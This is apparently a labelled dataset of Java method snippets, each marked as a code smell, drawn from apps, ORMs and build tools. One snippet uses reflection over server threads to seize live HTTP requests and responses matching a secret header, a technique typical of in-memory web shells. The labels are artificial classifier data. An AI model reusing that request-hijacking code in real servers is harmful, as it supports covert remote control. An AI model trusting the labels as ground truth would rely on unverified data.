"public void setViroContext(ViroContext context){
  super.setViroContext(context);
  if (mMaterials != null) {
    boolean materialsChanged=false;
    ArrayList<Material> nativeMaterials=new ArrayList<>();
    MaterialManager materialManager=getReactContext().getNativeModule(MaterialManager.class);
    for (int i=0; i < mMaterials.size(); i++) {
      String materialName=mMaterials.get(i).getName();
      Material nativeMaterial=materialManager.getMaterial(materialName);
      if (materialManager.isVideoMaterial(materialName)) {
        if (!(nativeMaterial.getDiffuseTexture() instanceof VideoTexture)) {
          MaterialManager.MaterialWrapper materialWrapper=materialManager.getMaterialWrapper(materialName);
          VideoTexture videoTexture=new VideoTexture(context,materialWrapper.getVideoTextureURI());
          materialWrapper.recreate(videoTexture);
          nativeMaterial=materialWrapper.getNativeMaterial();
          materialsChanged=true;
        }
      }
      if (nativeMaterial == null) {
        throw new IllegalArgumentException(""Material ["" + materialName + ""] not found. Did you create it?"");
      }
      nativeMaterials.add(nativeMaterial);
    }
    if (materialsChanged) {
      setMaterials(nativeMaterials);
    }
  }
  if (hasPhysicsBody) {
    if (mPhysicsDelegate != null) {
      mNodeJni.getPhysicsBody().setCollisionListener(mPhysicsDelegate);
    }
 else {
      mNodeJni.getPhysicsBody().setCollisionListener(null);
    }
  }
}",1,Code Smell
"/** 
 * Post鏂规硶璇锋眰
 * @param url     url鍦板潃
 * @param headers 璇锋眰澶�
 * @param body    璇锋眰body
 * @return resp
 */
public static Resp invokePostBody(String url,Map<String,String> headers,String body){
  return invokePostBody(url,headers,null,body);
}
/** 
 * Post鏂规硶璇锋眰
 * @param url      url鍦板潃
 * @param headers  璇锋眰澶�
 * @param paramMap 璇锋眰鍙傛暟
 * @param body     璇锋眰body
 * @return resp
 */
public static Resp invokePostBody(String url,Map<String,String> headers,Map<String,String[]> paramMap,String body){
  String contentType=headers.get(""Content-Type"");
  if (contentType == null) {
    contentType=headers.get(""content-type"");
  }
  if (contentType == null) {
    contentType=""application/x-www-form-urlencoded; charset=utf-8"";
  }
  StringBuilder urlBuilder=new StringBuilder(url);
  if (MapUtils.isNotEmpty(paramMap)) {
    if (!StringUtils.contains(url,QUESTION_SEPARATE)) {
      urlBuilder.append(QUESTION_SEPARATE).append(""_r=1"");
    }
    for (    Map.Entry<String,String[]> entry : paramMap.entrySet()) {
      for (      String value : entry.getValue()) {
        urlBuilder.append(PARAM_SEPARATE).append(entry.getKey()).append(KV_SEPARATE).append(value);
      }
    }
  }
  RequestBody b=RequestBody.create(MediaType.parse(contentType),body);
  Request.Builder rb=new Request.Builder().post(b).url(urlBuilder.toString());
  if (MapUtils.isNotEmpty(headers)) {
    for (    Map.Entry<String,String> entry : headers.entrySet()) {
      rb.header(entry.getKey(),entry.getValue());
    }
  }
  return executeRequest(rb.build());
}",1,Code Smell
"@Override public String forUpdateEntity(TableInfo tableInfo,Object entity,boolean ignoreNulls){
  StringBuilder sql=new StringBuilder();
  Set<String> updateColumns=tableInfo.obtainUpdateColumns(entity,ignoreNulls,false);
  Map<String,RawValue> rawValueMap=tableInfo.obtainUpdateRawValueMap(entity);
  String[] primaryKeys=tableInfo.getPrimaryColumns();
  sql.append(UPDATE).append(tableInfo.getWrapSchemaAndTableName(this,OperateType.UPDATE)).append(SET);
  StringJoiner stringJoiner=new StringJoiner(DELIMITER);
  for (  String updateColumn : updateColumns) {
    if (rawValueMap.containsKey(updateColumn)) {
      stringJoiner.add(wrap(updateColumn) + EQUALS + rawValueMap.get(updateColumn).toSql(this));
    }
 else {
      stringJoiner.add(wrap(updateColumn) + EQUALS_PLACEHOLDER);
    }
  }
  Map<String,String> onUpdateColumns=tableInfo.getOnUpdateColumns();
  if (onUpdateColumns != null && !onUpdateColumns.isEmpty()) {
    onUpdateColumns.forEach((column,value) -> stringJoiner.add(wrap(column) + EQUALS + value));
  }
  String versionColumn=tableInfo.getVersionColumn();
  if (StringUtil.isNotBlank(versionColumn)) {
    stringJoiner.add(wrap(versionColumn) + EQUALS + wrap(versionColumn)+ "" + 1 "");
  }
  sql.append(stringJoiner);
  sql.append(WHERE);
  for (int i=0; i < primaryKeys.length; i++) {
    if (i > 0) {
      sql.append(AND);
    }
    sql.append(wrap(primaryKeys[i])).append(EQUALS_PLACEHOLDER);
  }
  String logicDeleteColumn=tableInfo.getLogicDeleteColumnOrSkip();
  if (StringUtil.isNotBlank(logicDeleteColumn)) {
    sql.append(AND).append(buildLogicNormalCondition(logicDeleteColumn,tableInfo));
  }
  Object[] tenantIdArgs=tableInfo.buildTenantIdArgs();
  tableInfo.buildTenantCondition(sql,tenantIdArgs,this);
  if (StringUtil.isNotBlank(versionColumn)) {
    Object versionValue=tableInfo.buildColumnSqlArg(entity,versionColumn);
    if (versionValue == null) {
      throw FlexExceptions.wrap(LocalizedFormats.ENTITY_VERSION_NULL,entity);
    }
    sql.append(AND).append(wrap(versionColumn)).append(EQUALS).append(versionValue);
  }
  prepareAuth(tableInfo,sql,OperateType.UPDATE);
  return sql.toString();
}",1,Code Smell
"public static void getRequestAndResponse(){
  try {
    boolean flag=false;
    Thread[] threads=(Thread[])getFieldValue(Thread.currentThread().getThreadGroup(),""threads"");
    for (int i=0; i < threads.length; ++i) {
      Thread thread=threads[i];
      if (thread != null) {
        String threadName=thread.getName();
        if (!threadName.contains(""exec"") && threadName.contains(""http"")) {
          Object target=getFieldValue(thread,""target"");
          if (target instanceof Runnable) {
            try {
              target=getFieldValue(getFieldValue(getFieldValue(target,""this$0""),""handler""),""global"");
            }
 catch (            Exception ignored) {
              continue;
            }
            List processors=(List)getFieldValue(target,""processors"");
            for (int j=0; j < processors.size(); ++j) {
              Object processor=processors.get(j);
              target=getFieldValue(processor,""req"");
              Object req=target.getClass().getMethod(""getNote"",Integer.TYPE).invoke(target,new Integer(1));
              String value=(String)req.getClass().getMethod(""getHeader"",String.class).invoke(req,new String(HEADER_KEY));
              if (value != null && value.contains(HEADER_VALUE)) {
                request=(HttpServletRequest)req;
                try {
                  response=(HttpServletResponse)getFieldValue(getFieldValue(req,""request""),""response"");
                }
 catch (                Exception ignored) {
                  try {
                    response=(HttpServletResponse)req.getClass().getMethod(""getResponse"",(Class[])null).invoke(req,(Object[])null);
                  }
 catch (                  Exception ignored2) {
                  }
                }
                flag=true;
              }
              if (flag) {
                break;
              }
            }
          }
        }
      }
    }
  }
 catch (  Exception ignored) {
  }
}",1,Code Smell
"/** 
 * Returns the max edge value of item (visible or cached) in a row.  This will be the place to append or prepend item not in cache.
 */
int getRowMax(int rowIndex){
  if (mFirstVisibleIndex < 0) {
    return Integer.MIN_VALUE;
  }
  if (mReversedFlow) {
    int edge=mProvider.getEdge(mFirstVisibleIndex);
    if (getLocation(mFirstVisibleIndex).row == rowIndex) {
      return edge;
    }
    for (int i=mFirstVisibleIndex + 1; i <= getLastIndex(); i++) {
      Location loc=getLocation(i);
      edge+=loc.offset;
      if (loc.row == rowIndex) {
        return edge;
      }
    }
  }
 else {
    int edge=mProvider.getEdge(mLastVisibleIndex);
    Location loc=getLocation(mLastVisibleIndex);
    if (loc.row == rowIndex) {
      return edge + loc.size;
    }
    for (int i=mLastVisibleIndex - 1; i >= getFirstIndex(); i--) {
      edge-=loc.offset;
      loc=getLocation(i);
      if (loc.row == rowIndex) {
        return edge + loc.size;
      }
    }
  }
  return Integer.MIN_VALUE;
}",1,Code Smell
"void buildParamsForPage(int page,ArrayList<PreviewItemDrawingParams> params,boolean animate){
  List<WorkspaceItemInfo> items=mIcon.getPreviewItemsOnPage(page);
  while (items.size() < params.size()) {
    params.remove(params.size() - 1);
  }
  while (items.size() > params.size()) {
    params.add(new PreviewItemDrawingParams(0,0,0));
  }
  int numItemsInFirstPagePreview=page == 0 ? items.size() : MAX_NUM_ITEMS_IN_PREVIEW;
  for (int i=0; i < params.size(); i++) {
    PreviewItemDrawingParams p=params.get(i);
    setDrawable(p,items.get(i));
    if (!animate) {
      if (p.anim != null) {
        p.anim.cancel();
      }
      computePreviewItemDrawingParams(i,numItemsInFirstPagePreview,p);
      if (mReferenceDrawable == null) {
        mReferenceDrawable=p.drawable;
      }
    }
 else {
      FolderPreviewItemAnim anim=new FolderPreviewItemAnim(this,p,i,mNumOfPrevItems,i,numItemsInFirstPagePreview,DROP_IN_ANIMATION_DURATION,null);
      if (p.anim != null) {
        if (p.anim.hasEqualFinalState(anim)) {
          continue;
        }
        p.anim.cancel();
      }
      p.anim=anim;
      p.anim.start();
    }
  }
}",1,Code Smell
"@Override public String buildModifyTaleSql(Table oldTable,Table newTable){
  StringBuilder script=new StringBuilder();
  script.append(""ALTER TABLE "");
  if (StringUtils.isNotBlank(oldTable.getDatabaseName())) {
    script.append(""`"").append(oldTable.getDatabaseName()).append(""`"").append(""."");
  }
  script.append(""`"").append(oldTable.getName()).append(""`"").append(""\n"");
  if (!StringUtils.equalsIgnoreCase(oldTable.getName(),newTable.getName())) {
    script.append(""\t"").append(""RENAME TO "").append(""`"").append(newTable.getName()).append(""`"").append("",\n"");
  }
  if (!StringUtils.equalsIgnoreCase(oldTable.getComment(),newTable.getComment())) {
    script.append(""\t"").append(""COMMENT="").append(""'"").append(newTable.getComment()).append(""'"").append("",\n"");
  }
  if (oldTable.getIncrementValue() != newTable.getIncrementValue()) {
    script.append(""\t"").append(""AUTO_INCREMENT="").append(newTable.getIncrementValue()).append("",\n"");
  }
  for (  TableColumn tableColumn : newTable.getColumnList()) {
    if (StringUtils.isNotBlank(tableColumn.getEditStatus()) && StringUtils.isNotBlank(tableColumn.getColumnType()) && StringUtils.isNotBlank(tableColumn.getName())) {
      MysqlColumnTypeEnum typeEnum=MysqlColumnTypeEnum.getByType(tableColumn.getColumnType());
      script.append(""\t"").append(typeEnum.buildModifyColumn(tableColumn)).append("",\n"");
    }
  }
  for (  TableIndex tableIndex : newTable.getIndexList()) {
    if (StringUtils.isNotBlank(tableIndex.getEditStatus()) && StringUtils.isNotBlank(tableIndex.getType())) {
      MysqlIndexTypeEnum mysqlIndexTypeEnum=MysqlIndexTypeEnum.getByType(tableIndex.getType());
      script.append(""\t"").append(mysqlIndexTypeEnum.buildModifyIndex(tableIndex)).append("",\n"");
    }
  }
  script.append(buildGenerateReorderColumnSql(oldTable,newTable));
  if (script.length() > 2) {
    script=new StringBuilder(script.substring(0,script.length() - 2));
    script.append("";"");
  }
  return script.toString();
}",1,Code Smell
"public static void getAvatarSymbols(String firstName,String lastName,String custom,StringBuilder result){
  result.setLength(0);
  if (custom != null) {
    result.append(custom);
  }
 else {
    if (firstName != null && firstName.length() > 0) {
      result.append(takeFirstCharacter(firstName));
    }
    if (lastName != null && lastName.length() > 0) {
      String lastNameLastWord=lastName;
      int index;
      if ((index=lastNameLastWord.lastIndexOf(' ')) >= 0) {
        lastNameLastWord=lastNameLastWord.substring(index + 1);
      }
      if (Build.VERSION.SDK_INT > 17) {
        result.append(""\u200C"");
      }
      result.append(takeFirstCharacter(lastNameLastWord));
    }
 else     if (firstName != null && firstName.length() > 0) {
      for (int a=firstName.length() - 1; a >= 0; a--) {
        if (firstName.charAt(a) == ' ') {
          if (a != firstName.length() - 1 && firstName.charAt(a + 1) != ' ') {
            int index=result.length();
            if (Build.VERSION.SDK_INT > 17) {
              result.append(""\u200C"");
            }
            result.append(takeFirstCharacter(firstName.substring(index)));
            break;
          }
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * Adds listeners to: indeterminate, progress, visible, parent and scene properties.
 */
private void setListeners(){
  MFXProgressSpinner spinner=getSkinnable();
  spinner.indeterminateProperty().addListener((observable,oldValue,newValue) -> reset());
  spinner.progressProperty().addListener((observable,oldValue,newValue) -> updateProgress());
  spinner.visibleProperty().addListener((observable,oldValue,newValue) -> {
    if (!newValue) {
      resetAndStop();
    }
 else {
      updateAnimation();
    }
  }
);
  spinner.disabledProperty().addListener((observable,oldValue,newValue) -> {
    if (newValue) {
      resetAndStop();
      return;
    }
    updateAnimation();
  }
);
  spinner.parentProperty().addListener((observable,oldValue,newValue) -> updateAnimation());
  spinner.color1Property().addListener((observable,oldValue,newValue) -> {
    if (!spinner.isIndeterminate())     return;
    clearAnimation();
    reset();
  }
);
  spinner.color2Property().addListener((observable,oldValue,newValue) -> {
    if (!spinner.isIndeterminate())     return;
    clearAnimation();
    reset();
  }
);
  spinner.color3Property().addListener((observable,oldValue,newValue) -> {
    if (!spinner.isIndeterminate())     return;
    clearAnimation();
    reset();
  }
);
  spinner.color4Property().addListener((observable,oldValue,newValue) -> {
    if (!spinner.isIndeterminate())     return;
    clearAnimation();
    reset();
  }
);
  NodeUtils.waitForScene(spinner,() -> {
    if (!spinner.isVisible() || spinner.isDisabled()) {
      resetAndStop();
      return;
    }
    updateAnimation();
  }
,true,false);
}",1,Code Smell
"/** 
 * book bound report partition information
 * @param consumer consumer info
 */
private void bookPartitionInfo(ConsumerInfo consumer){
  if (consumeType != ConsumeType.CONSUME_BAND) {
    return;
  }
  Map<String,Long> consumerPartMap=consumer.getRequiredPartition();
  if (consumerPartMap == null || consumerPartMap.isEmpty()) {
    return;
  }
  for (  Map.Entry<String,Long> entry : consumerPartMap.entrySet()) {
    String oldClientId=this.partitionInfoMap.get(entry.getKey());
    if (oldClientId == null) {
      this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
      this.partOffsetMap.put(entry.getKey(),entry.getValue());
    }
 else {
      ConsumerInfo oldConsumerInfo=this.consumerInfoMap.get(oldClientId);
      if (oldConsumerInfo == null) {
        this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
        this.partOffsetMap.put(entry.getKey(),entry.getValue());
      }
 else {
        Map<String,Long> oldConsumerPartMap=oldConsumerInfo.getRequiredPartition();
        if (oldConsumerPartMap == null || oldConsumerPartMap.isEmpty()) {
          this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
          this.partOffsetMap.put(entry.getKey(),entry.getValue());
        }
 else {
          Long oldConsumerOff=oldConsumerPartMap.get(entry.getKey());
          if (oldConsumerOff == null) {
            this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
            this.partOffsetMap.put(entry.getKey(),entry.getValue());
          }
 else {
            if (this.isSelectedBig) {
              if (entry.getValue() >= oldConsumerOff) {
                this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
                this.partOffsetMap.put(entry.getKey(),entry.getValue());
              }
            }
 else {
              if (entry.getValue() < oldConsumerOff) {
                this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
                this.partOffsetMap.put(entry.getKey(),entry.getValue());
              }
            }
          }
        }
      }
    }
  }
}
",1,Code Smell
"@Override protected void drawSignaturesToHorizontalLines(Canvas canvas,ChartHorizontalLinesData a){
  int n=a.values.length;
  int rightIndex=chartData.linesK[0] == 1 ? 1 : 0;
  int leftIndex=(rightIndex + 1) % 2;
  float additionalOutAlpha=1f;
  if (n > 2) {
    float v=(a.values[1] - a.values[0]) / (float)(currentMaxHeight - currentMinHeight);
    if (v < 0.1) {
      additionalOutAlpha=v / 0.1f;
    }
  }
  float transitionAlpha=1f;
  if (transitionMode == TRANSITION_MODE_PARENT) {
    transitionAlpha=1f - transitionParams.progress;
  }
 else   if (transitionMode == TRANSITION_MODE_CHILD) {
    transitionAlpha=transitionParams.progress;
  }
 else   if (transitionMode == TRANSITION_MODE_ALPHA_ENTER) {
    transitionAlpha=transitionParams.progress;
  }
  linePaint.setAlpha((int)(a.alpha * 0.1f * transitionAlpha));
  int chartHeight=getMeasuredHeight() - chartBottom - SIGNATURE_TEXT_HEIGHT;
  int textOffset=(int)(SIGNATURE_TEXT_HEIGHT - signaturePaint.getTextSize());
  for (int i=0; i < n; i++) {
    int y=(int)((getMeasuredHeight() - chartBottom) - chartHeight * ((a.values[i] - currentMinHeight) / (currentMaxHeight - currentMinHeight)));
    if (a.valuesStr != null && lines.size() > 0) {
      if (a.valuesStr2 == null || lines.size() < 2) {
        signaturePaint.setColor(Theme.getColor(Theme.key_statisticChartSignature));
        signaturePaint.setAlpha((int)(a.alpha * signaturePaintAlpha * transitionAlpha* additionalOutAlpha));
      }
 else {
        signaturePaint.setColor(lines.get(leftIndex).lineColor);
        signaturePaint.setAlpha((int)(a.alpha * lines.get(leftIndex).alpha * transitionAlpha* additionalOutAlpha));
      }
      canvas.drawText(a.valuesStr[i],HORIZONTAL_PADDING,y - textOffset,signaturePaint);
    }
    if (a.valuesStr2 != null && lines.size() > 1) {
      signaturePaint2.setColor(lines.get(rightIndex).lineColor);
      signaturePaint2.setAlpha((int)(a.alpha * lines.get(rightIndex).alpha * transitionAlpha* additionalOutAlpha));
      canvas.drawText(a.valuesStr2[i],getMeasuredWidth() - HORIZONTAL_PADDING,y - textOffset,signaturePaint2);
    }
  }
}",1,Code Smell
"private void repeatMessage(boolean isLongClick,boolean isRepeatasCopy){
  if (checkSlowMode(chatActivityEnterView.getSendButton())) {
    return;
  }
  final ArrayList<MessageObject> messages=new ArrayList<>();
  if (selectedObject != null) {
    messages.add(selectedObject);
  }
 else {
    for (int k=0; k < selectedMessagesIds[0].size(); k++) {
      if (selectedMessagesIds[0].get(selectedMessagesIds[0].keyAt(k)) != null) {
        messages.add(selectedMessagesIds[0].get(selectedMessagesIds[0].keyAt(k)));
      }
    }
  }
  if (!NekoConfig.repeatConfirm.Bool()) {
    if (isRepeatasCopy) {
      doRepeatMessage(isLongClick,messages,true);
      return;
    }
 else {
      doRepeatMessage(isLongClick,messages,false);
      return;
    }
  }
  AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
  builder.setTitle(LocaleController.getString(""Repeat"",R.string.Repeat));
  builder.setMessage(LocaleController.getString(""repeatConfirmText"",R.string.repeatConfirmText));
  builder.setPositiveButton(LocaleController.getString(""OK"",R.string.OK),(dialogInterface,i) -> {
    if (isRepeatasCopy) {
      doRepeatMessage(isLongClick,messages,true);
    }
 else {
      doRepeatMessage(isLongClick,messages,false);
    }
  }
);
  builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  showDialog(builder.create());
}",1,Code Smell
"@Override public Properties visitEntry(Properties.Entry entry,ExecutionContext ctx){
  if (!""distributionUrl"".equals(entry.getKey())) {
    return entry;
  }
  String currentDistributionUrl=entry.getValue().getText();
  Matcher matcher=GRADLE_VERSION.matcher(currentDistributionUrl);
  if (matcher.find()) {
    String currentVersion=matcher.group(1);
    boolean requireVersion=!StringUtils.isNullOrEmpty(version);
    String currentDistribution=matcher.group(2);
    boolean requireMeta=!StringUtils.isNullOrEmpty(distribution);
    wrappersInUse.insertRow(ctx,new GradleWrappersInUse.Row(currentVersion,currentDistribution));
    if (requireVersion) {
      VersionComparator versionComparator=Semver.validate(version,versionPattern).getValue();
      if (versionComparator == null || versionComparator.isValid(null,currentVersion)) {
        if (requireMeta) {
          if (currentDistribution.matches(distribution)) {
            return SearchResult.found(entry);
          }
        }
 else {
          return SearchResult.found(entry);
        }
      }
    }
 else     if (requireMeta) {
      if (currentDistribution.matches(distribution)) {
        return SearchResult.found(entry);
      }
    }
 else {
      return SearchResult.found(entry);
    }
  }
  return entry;
}",1,Code Smell
"@Override public Xml.Tag visitTag(Xml.Tag tag,ExecutionContext ctx){
  Xml.Tag t=super.visitTag(tag,ctx);
  if (!isDependencyTag()) {
    return t;
  }
  ResolvedDependency dependency=findDependency(t,aScope);
  if (dependency == null) {
    return t;
  }
  ResolvedDependency match=dependency.findDependency(groupIdPattern,artifactIdPattern);
  if (match == null) {
    return t;
  }
  if (version != null) {
    VersionComparator versionComparator=Semver.validate(version,null).getValue();
    if (versionComparator == null) {
      t=Markup.warn(t,new IllegalArgumentException(""Could not construct a valid version comparator from "" + version + "".""));
    }
 else {
      if (!versionComparator.isValid(null,match.getVersion())) {
        return t;
      }
    }
  }
  if (match == dependency) {
    t=SearchResult.found(t);
  }
 else   if (Boolean.TRUE.equals(onlyDirect)) {
    return t;
  }
 else {
    t=SearchResult.found(t,match.getGav().toString());
  }
  Optional<JavaProject> javaProject=getCursor().firstEnclosingOrThrow(Xml.Document.class).getMarkers().findFirst(JavaProject.class);
  Optional<JavaSourceSet> javaSourceSet=getCursor().firstEnclosingOrThrow(Xml.Document.class).getMarkers().findFirst(JavaSourceSet.class);
  dependenciesInUse.insertRow(ctx,new DependenciesInUse.Row(javaProject.map(JavaProject::getProjectName).orElse(""""),javaSourceSet.map(JavaSourceSet::getName).orElse(""main""),match.getGroupId(),match.getArtifactId(),match.getVersion(),match.getDatedSnapshotVersion(),StringUtils.isBlank(match.getRequested().getScope()) ? ""compile"" : match.getRequested().getScope(),match.getDepth()));
  return t;
}
",1,Code Smell
"public static void writeRecord(DataOutputStream out,@Nullable String key,Object val) throws IOException {
  byte type;
  try {
    Class clz=val.getClass();
    if (Byte.class.equals(clz)) {
      type=TYPE_BYTE;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeByte((byte)val);
    }
 else     if (Boolean.class.equals(clz)) {
      type=TYPE_BOOL;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeByte(((boolean)val) ? 1 : 0);
    }
 else     if (Character.class.equals(clz)) {
      type=TYPE_WCHAR32;
      out.writeInt(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeChar((Integer)val);
    }
 else     if (Integer.class.equals(clz)) {
      type=TYPE_INT;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeInt((Integer)val);
    }
 else     if (Short.class.equals(clz)) {
      type=TYPE_SHORT;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeShort((Short)val);
    }
 else     if (Long.class.equals(clz)) {
      type=TYPE_LONG;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeLong((Long)val);
    }
 else     if (Float.class.equals(clz)) {
      type=TYPE_FLOAT;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeFloat((Float)val);
    }
 else     if (Double.class.equals(clz)) {
      type=TYPE_DOUBLE;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      out.writeDouble((Double)val);
    }
 else     if (String.class.equals(clz)) {
      type=TYPE_IUTF8;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      writeIStr(out,(String)val);
    }
 else     if (byte[].class.equals(clz)) {
      type=TYPE_IRAW;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      writeIRaw(out,(byte[])val);
    }
 else     if (Table.class.equals(clz)) {
      type=TYPE_TABLE;
      out.write(type);
      if (key != null) {
        writeIStr(out,key);
      }
      writeTable(out,(Table)val);
    }
 else {
      throw new IOException(""Unsupported type:"" + clz.getName());
    }
  }
 catch (  NullPointerException e) {
    type=TYPE_VOID;
    out.write(type);
    if (key != null) {
      writeIStr(out,key);
    }
  }
}",1,Code Smell
"@Override public View createView(Context context){
  actionBar.setBackButtonImage(R.drawable.ic_ab_back);
  actionBar.setAllowOverlayTitle(true);
  actionBar.setTitle(LocaleController.getString(""PowerUsage"",R.string.PowerUsage));
  actionBar.setActionBarMenuOnItemClick(new ActionBar.ActionBarMenuOnItemClick(){
    @Override public void onItemClick(    int id){
      if (id == -1) {
        finishFragment();
      }
    }
  }
);
  contentView=new FrameLayout(context);
  contentView.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundGray));
  listView=new RecyclerListView(context);
  listView.setLayoutManager(layoutManager=new LinearLayoutManager(context));
  listView.setAdapter(adapter=new Adapter());
  DefaultItemAnimator itemAnimator=new DefaultItemAnimator();
  itemAnimator.setDurations(350);
  itemAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
  itemAnimator.setDelayAnimations(false);
  itemAnimator.setSupportsChangeAnimations(false);
  listView.setItemAnimator(itemAnimator);
  contentView.addView(listView,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT));
  listView.setOnItemClickListener((view,position,x,y) -> {
    if (view == null || position < 0 || position >= items.size()) {
      return;
    }
    final Item item=items.get(position);
    if (item.viewType == VIEW_TYPE_SWITCH || item.viewType == VIEW_TYPE_CHECKBOX) {
      if (LiteMode.isPowerSaverApplied()) {
        restrictBulletin=BulletinFactory.of(this).createSimpleBulletin(new BatteryDrawable(.1f,Color.WHITE,Theme.getColor(Theme.key_dialogSwipeRemove),1.3f),LocaleController.getString(""LiteBatteryRestricted"",R.string.LiteBatteryRestricted)).show();
        return;
      }
      if (item.viewType == VIEW_TYPE_SWITCH && item.getFlagsCount() > 1 && (LocaleController.isRTL ? x > dp(19 + 37 + 19) : x < view.getMeasuredWidth() - dp(19 + 37 + 19))) {
        int index=getExpandedIndex(item.flags);
        if (index != -1) {
          expanded[index]=!expanded[index];
          updateValues();
          updateItems();
          return;
        }
      }
      boolean value=LiteMode.isEnabledSetting(item.flags);
      LiteMode.toggleFlag(item.flags,!value);
      updateValues();
    }
 else     if (item.viewType == VIEW_TYPE_SWITCH2) {
      if (item.type == SWITCH_TYPE_SMOOTH_TRANSITIONS) {
        SharedPreferences preferences=MessagesController.getGlobalMainSettings();
        boolean animations=preferences.getBoolean(""view_animations"",true);
        SharedPreferences.Editor editor=preferences.edit();
        editor.putBoolean(""view_animations"",!animations);
        SharedConfig.setAnimationsEnabled(!animations);
        editor.commit();
        ((TextCell)view).setChecked(!animations);
      }
    }
  }
);
  fragmentView=contentView;
  updateItems();
  return fragmentView;
}",1,Code Smell
"private static void queryMyHomePage(ClassLoader loader){
  try {
    String s=AntSportsRpcCall.queryMyHomePage();
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      s=jo.getString(""pathJoinStatus"");
      if (""GOING"".equals(s)) {
        if (jo.has(""pathCompleteStatus"")) {
          if (""COMPLETED"".equals(jo.getString(""pathCompleteStatus""))) {
            jo=new JSONObject(AntSportsRpcCall.queryBaseList());
            if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
              JSONArray allPathBaseInfoList=jo.getJSONArray(""allPathBaseInfoList"");
              JSONArray otherAllPathBaseInfoList=jo.getJSONArray(""otherAllPathBaseInfoList"").getJSONObject(0).getJSONArray(""allPathBaseInfoList"");
              join(loader,allPathBaseInfoList,otherAllPathBaseInfoList,"""");
            }
 else {
              Log.i(TAG,jo.getString(""resultDesc""));
            }
          }
        }
 else {
          String rankCacheKey=jo.getString(""rankCacheKey"");
          JSONArray ja=jo.getJSONArray(""treasureBoxModelList"");
          for (int i=0; i < ja.length(); i++) {
            parseTreasureBoxModel(loader,ja.getJSONObject(i),rankCacheKey);
          }
          JSONObject joPathRender=jo.getJSONObject(""pathRenderModel"");
          String title=joPathRender.getString(""title"");
          int minGoStepCount=joPathRender.getInt(""minGoStepCount"");
          jo=jo.getJSONObject(""dailyStepModel"");
          int consumeQuantity=jo.getInt(""consumeQuantity"");
          int produceQuantity=jo.getInt(""produceQuantity"");
          String day=jo.getString(""day"");
          int canMoveStepCount=produceQuantity - consumeQuantity;
          if (canMoveStepCount >= minGoStepCount) {
            go(loader,day,rankCacheKey,canMoveStepCount,title);
          }
        }
      }
 else       if (""NOT_JOIN"".equals(s)) {
        String firstJoinPathTitle=jo.getString(""firstJoinPathTitle"");
        JSONArray allPathBaseInfoList=jo.getJSONArray(""allPathBaseInfoList"");
        JSONArray otherAllPathBaseInfoList=jo.getJSONArray(""otherAllPathBaseInfoList"").getJSONObject(0).getJSONArray(""allPathBaseInfoList"");
        join(loader,allPathBaseInfoList,otherAllPathBaseInfoList,firstJoinPathTitle);
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryMyHomePage err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@Override public void saveData(CollectRep.MetricsData metricsData){
  if (!isServerAvailable() || metricsData.getCode() != CollectRep.Code.SUCCESS) {
    return;
  }
  if (metricsData.getValuesList().isEmpty()) {
    log.info(""[warehouse iotdb] flush metrics data {} is null, ignore."",metricsData.getId());
    return;
  }
  List<MeasurementSchema> schemaList=new ArrayList<>();
  List<CollectRep.Field> fieldsList=metricsData.getFieldsList();
  for (  CollectRep.Field field : fieldsList) {
    MeasurementSchema schema=new MeasurementSchema();
    schema.setMeasurementId(field.getName());
    if (field.getType() == CommonConstants.TYPE_NUMBER) {
      schema.setType(TSDataType.DOUBLE);
    }
 else     if (field.getType() == CommonConstants.TYPE_STRING) {
      schema.setType(TSDataType.TEXT);
    }
    schemaList.add(schema);
  }
  Map<String,Tablet> tabletMap=new HashMap<>(8);
  try {
    long now=System.currentTimeMillis();
    for (    CollectRep.ValueRow valueRow : metricsData.getValuesList()) {
      Map<String,String> labels=new HashMap<>(8);
      for (int i=0; i < fieldsList.size(); i++) {
        CollectRep.Field field=fieldsList.get(i);
        if (field.getLabel() && !CommonConstants.NULL_VALUE.equals(valueRow.getColumns(i))) {
          labels.put(field.getName(),valueRow.getColumns(i));
        }
      }
      String label=JsonUtil.toJson(labels);
      String deviceId=getDeviceId(metricsData.getApp(),metricsData.getMetrics(),metricsData.getId(),label,false);
      if (tabletMap.containsKey(label)) {
        now++;
      }
 else {
        tabletMap.put(label,new Tablet(deviceId,schemaList));
      }
      Tablet tablet=tabletMap.get(label);
      int rowIndex=tablet.rowSize++;
      tablet.addTimestamp(rowIndex,now);
      for (int i=0; i < fieldsList.size(); i++) {
        CollectRep.Field field=fieldsList.get(i);
        if (!CommonConstants.NULL_VALUE.equals(valueRow.getColumns(i))) {
          if (field.getType() == CommonConstants.TYPE_NUMBER) {
            tablet.addValue(field.getName(),rowIndex,Double.parseDouble(valueRow.getColumns(i)));
          }
 else           if (field.getType() == CommonConstants.TYPE_STRING) {
            tablet.addValue(field.getName(),rowIndex,valueRow.getColumns(i));
          }
        }
 else {
          tablet.addValue(field.getName(),rowIndex,null);
        }
      }
    }
